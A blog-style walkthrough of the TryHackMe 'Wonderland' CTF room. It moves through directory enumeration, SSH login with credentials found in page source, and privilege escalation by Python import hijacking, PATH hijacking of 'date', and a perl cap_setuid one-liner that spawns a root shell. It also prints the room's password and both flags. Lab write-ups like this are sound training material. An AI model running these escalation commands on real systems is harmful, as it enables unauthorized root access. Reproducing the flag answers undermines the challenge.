---
title: "Wonderland"
date: 2026-05-24
category: "ctf"
excerpt: "Walkthrough of the TryHackMe Wonderland room - Fall down the rabbit hole and enter wonderland."
image: "/images/blog/129.png"
readtime: "28 min read"
draft: false
---

# Wonderland

This challenge has no description at all. I just get a port and the goal is to get root and read the flag. Cool, let's begin.

---

## Recon

Starting with nmap like always.

```bash
nmap -sCV -p- 10.82.145.232
```

![](/images/blog/wonderland/1.png)

Two ports open. 22 (SSH) and 80 (HTTP). SSH won't give me anything without creds so port 80 is most definitely going to be my way in.

---

## Web - Port 80

Loaded the front page. Nothing really interesting on it.

![](/images/blog/wonderland/2.png)

Checked the source page too and it looks fine, nothing hidden in there.

Time for gobuster to look for hidden paths.

```bash
gobuster dir -u http://10.82.145.232 -w /usr/share/wordlists/dirb/common.txt
```

![](/images/blog/wonderland/3.png)

Only two results. `/img` and `/r`.

The `/img` one has three images that I'm gonna download and check for anything hidden inside them.

![](/images/blog/wonderland/4.png)

The `/r` one is just more text telling me to "keep following the white rabbit." Not sure if that's some kind of trap but I'll follow my instinct and check the photos first.

![](/images/blog/wonderland/5.png)

---

## The Images (aka the rabbit hole)

First I opened the images in the browser, then downloaded them to my machine.

I ran a bunch of different commands poking around with the photos. Stuff like:

```bash
steghide extract -sf alice_door.jpg
```

And a few more. Wasn't getting anywhere. Then I ran:

```bash
binwalk -e alice_door.png
```

![](/images/blog/wonderland/6.png)

And it extracted a `.zlib` file. Not sure what that is so let me google it.

And this is where I went down a proper rabbit hole. Which, given that this entire room is about rabbit holes, is kinda funny. I spent way too long on this and started thinking the images were just a dead end the whole time.

So I decided to switch over to that second path `/r` and maybe come back to the images later if I didn't find anything.

---

## Following the White Rabbit

Let me scan for paths under `/r`.

```bash
gobuster dir -u http://10.82.145.232/r -w /usr/share/wordlists/dirb/common.txt
```

Result gave me `/a`. So now I have `http://10.82.145.232/r/a`.

And here it clicked pretty quick. This is spelling out **rabbit**. So I just started adding the letters manually and it kept working. r, a, b, b, i, t. Not gonna lie I wasn't sure this was actually where I needed to go or just another troll, but I kept following it.

This is the last path:

```
http://10.82.145.232/r/a/b/b/i/t/
```

![](/images/blog/wonderland/7.png)

Viewing the source page on this one has something interesting. That looks like credentials. For the user `alice`.

![](/images/blog/wonderland/8.png)

Let's try to SSH with those.

```bash
ssh alice@10.82.145.232
```

Pasted the password and it worked. I'm in.

![](/images/blog/wonderland/9.png)

---

## Privilege Escalation - alice to rabbit

Now I want root for both flags. First thing always, `sudo -l` to see what I can run as root without a password.

```bash
sudo -l
```

![](/images/blog/wonderland/10.png)

This is interesting. It says **rabbit** can run a python script as root. But I'm not rabbit. So I guess I have to escalate to rabbit first, then to root.

The script I'm working with is `walrus_and_the_carpenter.py`. If you open it and look at the top, it starts with `import random`.

This is the classic trick. If I create my own python script called `random.py` in the same directory, the script will pull MY file instead of the actual random library. Python looks in the current directory first.

So I made the file:

```bash
nano random.py
```

And dropped a shell inside it:

```python
import pty
pty.spawn("/bin/bash")
```

Then I run the real script through sudo as rabbit:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

And there it is. Now I'm rabbit.

![](/images/blog/wonderland/11.png)

---

## Privilege Escalation - rabbit to hatter

Inside rabbit's home directory there's a file called `teaParty`. If you run it, it runs as root.

![](/images/blog/wonderland/12.png)

I cat it to see what's going on inside.

```bash
cat teaParty
```

![](/images/blog/wonderland/13.png)

Found this very interesting line:

```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

The opportunity here, is that `/bin/echo` has a full path but `date` does not. It's being called by name again. Same kind of bug as before basically.

So my plan is to make a fake `date` script somewhere I can write to, like `/tmp`, that spawns a shell. Then make it executable. Then put that directory at the front of my `$PATH` so my fake `date` gets found before the real one.

```bash
nano /tmp/date
```

Inside it:

```bash
#!/bin/bash
/bin/bash
```

![](/images/blog/wonderland/14.png)

Then make it executable and fix the PATH:

```bash
chmod +x /tmp/date
export PATH=/tmp:$PATH
./teaParty
```

And I become hatter.

![](/images/blog/wonderland/15.png)

Okay so I'm not root but this is progress at least. I guess I have to keep repeating this process to finally get there.

---

## Privilege Escalation - hatter to root

Inside hatter's home directory there's a password, probably his. The string is:

```
WhyIsARavenLikeAWritingDesk?
```

![](/images/blog/wonderland/16.png)

Tried `sudo -l` with it:

```bash
sudo -l
```

But that returns that hatter may not run sudo. Of course it does.

Okay, sudo is a dead end. Let me check for setuid binaries instead.

```bash
find / -perm -4000 -type f 2>/dev/null
```

![](/images/blog/wonderland/17.png)

Here I'm looking for something weird that's not supposed to be there. And... nothing really interesting.

This is where I got stuck. Didn't know what else to try for escalation. Spent a couple minutes just thinking and poking around dead ends getting nowhere.

Then I remembered capabilities. Ran a capability check:

```bash
getcap -r / 2>/dev/null
```

![](/images/blog/wonderland/18.png)

And there it is. Perl has `cap_setuid+ep`. That means perl itself can become any user, including root, without needing sudo or being setuid. Nice.

Looked up the syntax online and found this:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![](/images/blog/wonderland/19.png)

Ran it and got permission denied. Wasn't sure why at first. My guess is that because of how I escalated through that PATH trick, I never actually authenticated properly as hatter. So I switched to hatter properly using his password:

```bash
su hatter
```

(And THIS is exactly why I needed his password from earlier.)

After switching properly, I ran the perl command again:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

And I'm finally root.

![](/images/blog/wonderland/20.png)

---

## The Flags

Two flags to find, user.txt and root.txt. Ran a couple of find commands and grabbed them both.

**user.txt: `thm{"Curiouser and curiouser!"}`**

**root.txt: `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}`**

![](/images/blog/wonderland/21.png)

Done.

---

## Answers

**user.txt** `thm{"Curiouser and curiouser!"}`

**root.txt** `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`

---

## Takeaway

Pretty fun room. It got a bit hard towards the end and I got stuck for a couple minutes on the hatter to root jump, but I figured it out eventually.

The whole thing is built around the same idea showing up in different forms. The images were an actual rabbit hole that wasted my time (lesson learned, don't sink forever into stego before checking your other leads). Then the escalation chain was three variations of the same theme. First a hijacked python import, then a hijacked PATH lookup, then a capability nobody should have left on perl.

The big lesson is to watch how things get called. A full path like `/bin/echo` is safe, but the moment something gets called by name only, like `date` or `import random`, you can slip your own version in front of it. That bug showed up twice in this single box.

Also a good reminder that sudo and setuid aren't the only ways up. Capabilities are easy to forget and `getcap -r /` saved me here.

Really well made. Enjoyed it a lot.

---

